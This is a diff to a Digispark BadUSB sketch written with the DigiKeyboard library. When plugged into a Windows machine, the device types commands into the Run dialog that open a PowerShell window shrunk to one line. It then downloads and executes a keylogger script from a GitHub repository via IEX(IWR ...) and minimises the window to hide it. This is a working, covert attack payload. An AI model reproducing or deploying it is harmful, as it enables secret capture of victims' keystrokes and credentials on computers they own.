@@ -2,20 +2,30 @@
 // Discord: syke#1166 / Syke#1166
 
 #include "DigiKeyboard.h"
-void setup() {
 
+
+void setup() {
+  // 1 LED ON = RUNNNING / 2 LEDS ON = DONE
+  
+  pinMode(1, OUTPUT); //LED on Model A
+  digitalWrite(1, HIGH);
+  DigiKeyboard.delay(100);
+  digitalWrite(1, LOW);
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(1000);
-DigiKeyboard.print("powershell");
+  DigiKeyboard.delay(600);
+DigiKeyboard.print("powershell -noexit -command [console]::WindowWidth=100; [console]::WindowHeight=1; [console]::BufferWidth=[console]::WindowWidth=1");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(300);
-DigiKeyboard.print("cd $env:temp");
+DigiKeyboard.print("IEX(IWR https://raw.githubusercontent.com/ISykeI/Digispark_Keylogger_Webhook/main/keylog.ps1 -UseBasicParsing); Invoke-keylog.ps1;");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
-DigiKeyboard.delay(300);
-DigiKeyboard.print("IEX(IWR https://raw.githubusercontent.com/ISykeI/Digispark_Keylogger_Webhook/main/keylog.ps1 -UseBasicParsing); Invoke-keylog.ps1");
-DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(400);
+DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);
+   DigiKeyboard.delay(300);
+    DigiKeyboard.sendKeyStroke(KEY_N);
 
+
+      digitalWrite(1, HIGH);
 }
 
 void loop() {
